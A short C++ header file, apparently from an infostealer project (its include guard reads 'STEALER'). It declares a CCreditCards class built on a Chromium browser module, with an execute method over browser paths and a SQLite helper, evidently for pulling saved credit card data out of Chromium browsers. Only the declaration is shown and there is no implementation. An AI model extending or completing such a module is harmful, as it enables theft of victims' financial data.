//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CCREDITCARDS_H
#define STEALER_CCREDITCARDS_H


#include "../ChromiumBrowserModule.h"
#include "../../../../../utils/SQLiteUtil.h"



class CCreditCards : public ChromiumBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
};


#endif //STEALER_CCREDITCARDS_H
